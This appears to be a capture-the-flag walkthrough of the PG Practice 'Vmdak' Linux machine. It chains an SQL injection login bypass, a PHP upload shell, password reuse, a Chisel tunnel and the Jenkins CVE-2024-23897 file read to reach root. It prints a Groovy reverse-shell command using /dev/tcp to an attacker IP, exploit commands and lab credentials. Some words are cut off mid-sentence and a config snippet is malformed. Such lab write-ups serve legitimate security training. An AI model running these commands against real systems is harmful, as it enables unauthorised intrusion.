## Introduction

In this walkthrough, I worked on *Vmdak*, an intermediate-rated Linux machine on PG Practice. Initial enumeration revealed **port 9443** running a **Prison Management System (PMS)**. Through online research, I discovered that the system was vulnerable to an **SQL injection authentication**, allowing me to access the admin panel.

Inside the admin interface, I found a **file upload functionality**. By modifying the `Content-Type` header using **Burp Suite**, I successfully uploaded a **m** and gained initial access as `www-data`.

During earlier enumeration, I had found a **password** on the website. Using this, I **laterally moved** from `www-data` to the **local user `vmdak`**. Further enumeration as `vmdak` showed that **port 8080** was open locally. I used **Chisel** to create a reverse SOCKS tunnel and accessed this port, which turned out to be a **J**.

To proceed, I needed the `initialAdminPassword`, so I exploited **Jenkins' arbitrary file read vulnerability** to retrieve it. After completing the setup, I used **Jenkins' Script Console** to run a **Groovy reverse shell**, ultimately gaining a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 21

Version - vsftpd 3.0.5

Anonymous access is allowed I found config.xml file in FTP server:

![image.png](image%203.png)

We don’t have write access to the server.

```xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors/>
  <version>2.401.2</version>
  <numExecutors>2</numExecutors>

      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>

  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>
```

This is `config.xml` of Jenkins server.

### Port 22 (SSH)

Version - OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.58 ((Ubuntu))

**Directory Scan**

```xml
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

### Port 9443

We are redirected to Prison Management System, searching for public exploits I revealed that system is vulnerable to SQL injection Byass:

[Prison Management System - SQL Injection Authentication Bypass](https://www.exploit-db.com/exploits/52017)

Under `User Management > Leave Record` I found a user that has a description with password:

![image.png](image%205.png)

Then I searched for RCE vulnerabilities of PMS and found this PoC:
[Prison Management System - File upload RCE (/Admin/edit-photo.php)](https://github.com/fubxx/CVE/blob/main/PrisonManagementSystemRCE.md)

I uploaded PHP reverse shell and accesses it from browser and got a shell.

## Privilege Escalation

Let’s get an interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

When reading `login.php` script I found that server internally running MySQL server:

```bash
www-data@vmdak:/var/www/prison/Account$ cat Login.php | grep pass
```

![image.png](image%208.png)

We see locally running MySQL server:

![image.png](image%209.png)

![image.png](image%2010.png)

Searching DB credentials I found under `/var/www/prison/database`

## Credentials

```xml
Malcom --> vmdak : RonnyCache001
root : sqlCr3ds3xp0seD
Jenkins initAdminPass - 140ef31373034d19a77baa9c6b84a200
```

## Lateral Movement

Catting `/etc/passwd` file I see there is another user `vmdak` , I used previously discovered password for that account.

From previous file from ftp server we noticed Jenkins and I see locally open port 8080:

![image.png](image%2012.png)

maybe that’s where Jenkins is running.

I am gonna perform chisel reverse port forwarding:

```bash
./chisel server --reverse --port 1234 #kali

./chisel client 192.168.45.227:1234 R:8081:127.0.0.1:8080 #target
```

Now accessing the server we see that it runs jenkins instance:

![image.png](image%2013.png)

It requires Jenkins `initialAdminPassword` which is given by Jenkins itself to the user when setting it up.

We need to read that file to see the password and proceed.

I have seen the version of Jenkins before, which is `2.401.2` I am gonna search for public exploits for it.

I found this [PoC](https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability), I am gonna give it a try.

I tried it and it actually worked:

```bash
python3 CVE-2024-23897.py -u http://127.0.0.1:8081/ -f /etc/passwd
```

![image.png](image%2014.png)

But it failed with `/root/.jenkins/secrets/initialAdminPassword`.

I found another one https://github.com/godylockz/CVE-2024-23897

```bash
python3 jenkins_fileread.py -u http://127.0.0.1:8081
```

![image.png](image%2015.png)

![image.png](image%2016.png)

Actually I can read `proof.txt` but I am gonna try to get a shell as root:

![image.png](image%2017.png)

After setting up Jenkins let’s use Groovy scripts to get reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/192.168.45.227/21; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![image.png](image%2018.png)

![image.png](image%2019.png)

After executing it now we are root!

## Mitigation

- **Sanitize Inputs:** Prevent SQL injection by using parameterized queries or ORM frameworks.
- **Secure File Uploads:** Enforce strict MIME type validation, file extension filtering, and use server-side verification for uploads.
- **Credential Management:** Avoid storing plaintext passwords in web-accessible locations and enforce password complexity.
- **Restrict Internal Services:** Limit local-only services like Jenkins to internal interfaces and secure them with firewalls.
- **Jenkins Hardening:** Disable script console in production environments and apply file access restrictions.
- **Use Principle of Least Privilege:** Minimize user permissions and monitor lateral movement potential.
- **Regular Patching:** Keep web applications, CMS, and CI tools like Jenkins updated to patch known vulnerabilities.
